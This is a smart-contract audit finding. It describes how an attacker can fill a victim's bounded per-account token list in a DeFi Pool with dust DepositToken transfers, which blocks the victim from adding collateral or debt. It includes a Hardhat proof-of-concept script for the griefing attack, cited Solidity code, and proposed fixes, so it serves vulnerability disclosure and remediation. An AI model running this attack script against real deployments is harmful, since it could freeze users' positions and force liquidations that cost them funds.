### Title
Attacker can force-overflow a victim's bounded per-account token set via dust `DepositToken` transfers, freezing the victim's ability to deposit or borrow - (File: contracts/Pool.sol)

### Summary
CVE-2018-5127 is a buffer overflow triggered by manipulating a script-accessible list (`animatedPathSegList`) beyond its intended bounds. The Metronome analog is the per-account token lists `depositTokensOfAccount` / `debtTokensOfAccount` in `Pool`, which are bounded by `MAX_TOKENS_PER_USER = 30` but are mutated as a side effect of permissionless `DepositToken.transfer`/`transferFrom` and `deposit(amount, onBehalfOf_)`. An unprivileged attacker can push a victim's combined list to the cap with dust, after which every code path that would add a new token to the victim's account reverts with `UserReachedMaxTokens`.

### Finding Description
`Pool.addToDepositTokensOfAccount` and `addToDebtTokensOfAccount` revert once `debt + deposit` tokens of an account reach 30 [1](#0-0) [2](#0-1) .

`DepositToken._transfer` unconditionally registers the recipient on first receipt, and `DepositToken._mint` (reached via `deposit(amount_, onBehalfOf_)`) does the same for an arbitrary beneficiary [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) .

Attack path (all public, no privileged role):
1. Attacker deposits a tiny amount into each of the pool's deposit tokens (up to `MAX_TOKENS_PER_USER` collaterals are allowed by `addDepositToken`, `Pool.sol:703`).
2. For a token the victim has never held, the attacker calls `msdToken.transfer(victim, 1 wei)` (or `deposit(1 wei, victim)`). `_revertIfLocked` passes because the attacker account has no debt, and `_transfer` calls `pool.addToDepositTokensOfAccount(victim)`.
3. Repeat for all listed deposit tokens until `depositTokensOfAccount.length(victim) + debtTokensOfAccount.length(victim) == 30`.

From then on:
- `msdToken.transfer`/`transferFrom`/`deposit(onBehalfOf = victim)`/`seize(..., victim, ...)` for any token the victim doesn't already hold revert via `UserReachedMaxTokens`, so the victim cannot add a new collateral type to rescue an underwater position.
- `DebtToken.issue/mint` on behalf of the victim reverts the same way, so the victim cannot open new debt positions.

No modifier stops this: `transfer` is not `nonReentrant`-protected against this, `onlyIfAdditionWillNotReachMaxTokens` is exactly the check being abused, and nothing requires the victim's consent to receive tokens.

### Impact Explanation
The invariant "a user can always deposit additional collateral or repay/enter positions" is broken. A victim with an open debt position whose collateral factor deteriorates cannot deposit a *different* collateral type to restore health, and cannot be saved by a third party depositing `onBehalfOf` them — every such transaction reverts. This can force an otherwise-avoidable liquidation (loss of the liquidation fee + collateral discount) and constitutes temporary freezing of funds / liveness failure of the position. It is not permanent: the victim regains slots by fully withdrawing or transferring out a dust balance (`_burn`/`_transfer` call `removeFromDepositTokensOfAccount` when balance hits zero, `DepositToken.sol:460-462`, `523-525`), but recovery costs gas per slot and may be impossible to do safely during a fast price crash.

### Likelihood Explanation
Cost is bounded by ~30 dust deposits/transfers (one per listed deposit token) plus negligible token value; the pool itself caps registered deposit tokens at 30, so filling the combined list is feasible whenever the number of listed deposit tokens plus the victim's existing debt tokens reaches 30. Effectiveness depends on the deployed count of deposit tokens — with few collateral types listed the attacker can only partially fill the list, and the attack is harmless to victims who already hold all listed tokens. Front-running a victim's deposit or leverage transaction with the dust transfers is enough to make it revert.

### Recommendation
- Make the list mutation consensual: only register a token into `depositTokensOfAccount` for `onBehalfOf == _msgSender()` deposits, or require the recipient to have opted in / already approved receipt.
- Alternatively, stop reverting at the cap: keep the bounded list for accounting-critical paths only (e.g., `debtTokensOfAccount` used by `debtOf`/`debtPositionOf`), and track extra deposit tokens off-list or via a per-account claimable balance so an overflow cannot block deposits/transfers.
- Cheapest mitigation: revert the `add` silently (skip adding when at cap) for deposit-token receipts while keeping the revert for debt-token issuance, since unlisted deposits don't affect `debtPositionOf` correctness for debt tokens.

### Proof of Concept
Hardhat-style sketch against a forked deployment (assume a Pool with deposit tokens `msdA..msdN` registered by governor):

```ts
// attacker deposits dust into each listed deposit token and transfers to victim
const victim = bob.address;
const depositTokens: DepositToken[] = await getAllDepositTokens(pool); // up to 30

for (const msd of depositTokens) {
  if ((await msd.balanceOf(victim)) == 0 &&
      (await pool.debtPositionOf(attacker.address)) /* attacker has no debt => unlocked */) {
    await underlying(msd).approve(msd.address, 10);
    await msd.deposit(10, attacker.address);        // mint dust to attacker
    await msd.transfer(victim, 1);                  // adds token to victim's list
  }
}

// victim's combined list is now at MAX_TOKENS_PER_USER
expect(await pool.getDepositTokensOfAccount(victim)).to.have.length(30);

// 1) victim cannot receive a new deposit token type
const newMsd = await deployNewDepositToken();       // governor lists it, or any unheld one
await underlying(newMsd).approve(newMsd.address, 100);
await expect(newMsd.deposit(100, victim)).to.be.revertedWithCustomError(pool, 'UserReachedMaxTokens');
await expect(newMsd.transfer(victim, 1)).to.be.revertedWithCustomError(pool, 'UserReachedMaxTokens');

// 2) victim cannot issue debt in a new synthetic market (same revert from addToDebtTokensOfAccount)
await expect(debtToken.issue(victim, parseEther('1'))).to.be.revertedWithCustomError(pool, 'UserReachedMaxTokens');

// 3) recovery requires victim to fully withdraw/transfer each dust token to free a slot
await msd0.connect(bob).withdraw(1, bob.address);   // balance 0 -> removeFromDepositTokensOfAccount
expect(await pool.getDepositTokensOfAccount(victim)).to.have.length(29);
```

Key calls to trace: `DepositToken.transfer → _transfer → pool.addToDepositTokensOfAccount` (`DepositToken.sol:348-354`, `518-520`), the cap check in `onlyIfAdditionWillNotReachMaxTokens` (`Pool.sol:143-148`), and the freeing path in `_burn`/`_transfer` (`DepositToken.sol:460-462`, `523-525`).

### Citations

**File:** contracts/Pool.sol (L143-148)
```text
    modifier onlyIfAdditionWillNotReachMaxTokens(address account_) {
        if (debtTokensOfAccount.length(account_) + depositTokensOfAccount.length(account_) >= MAX_TOKENS_PER_USER) {
            revert UserReachedMaxTokens();
        }
        _;
    }
```

**File:** contracts/Pool.sol (L204-220)
```text
    function addToDebtTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _debtToken = _msgSender();
        _revertIfSenderIsNotDebtToken(_debtToken);
        if (!debtTokensOfAccount.add(account_, _debtToken)) revert DebtTokenAlreadyExists();
    }

    /**
     * @notice Add a deposit token to the per-account list
     * @dev This function is called from `DepositToken` when user's balance changes from `0`
     * @dev The caller should ensure to not pass `address(0)` as `_account`
     * @param account_ The account address
     */
    function addToDepositTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _depositToken = _msgSender();
        _revertIfSenderIsNotDepositToken(_depositToken);
        if (!depositTokensOfAccount.add(account_, _depositToken)) revert DepositTokenAlreadyExists();
    }
```

**File:** contracts/DepositToken.sol (L211-237)
```text
    function deposit(
        uint256 amount_,
        address onBehalfOf_
    ) external override whenNotPaused nonReentrant onlyIfDepositTokenExists returns (uint256 _deposited, uint256 _fee) {
        if (amount_ == 0) revert AmountIsZero();
        if (onBehalfOf_ == address(0)) revert BeneficiaryIsNull();

        IPool _pool = pool;
        IERC20 _underlying = underlying;
        address _msgSender = _msgSender();
        address _treasury = address(_pool.treasury());

        if (_msgSender == _treasury) revert TreasuryCanNotDeposit();

        uint256 _balanceBefore = _underlying.balanceOf(_treasury);
        _underlying.safeTransferFrom(_msgSender, _treasury, amount_);
        amount_ = _underlying.balanceOf(_treasury) - _balanceBefore;

        (_deposited, _fee) = quoteDepositOut(amount_);
        if (_fee > 0) {
            _mint(_pool.feeCollector(), _fee);
        }

        _mint(onBehalfOf_, _deposited);

        emit CollateralDeposited(_msgSender, onBehalfOf_, amount_, _deposited, _fee);
    }
```

**File:** contracts/DepositToken.sol (L348-354)
```text
    function transfer(address to_, uint256 amount_) external override returns (bool) {
        address _msgSender = _msgSender();
        _revertIfLocked(_msgSender, amount_);

        _transfer(_msgSender, to_, amount_);
        return true;
    }
```

**File:** contracts/DepositToken.sol (L485-488)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_balanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(account_);
        }
```

**File:** contracts/DepositToken.sol (L517-525)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_recipientBalanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(recipient_);
        }

        // Remove this token from the deposit tokens list if the sender's balance goes to zero
        if (amount_ > 0 && balanceOf[sender_] == 0) {
            pool.removeFromDepositTokensOfAccount(sender_);
        }
```
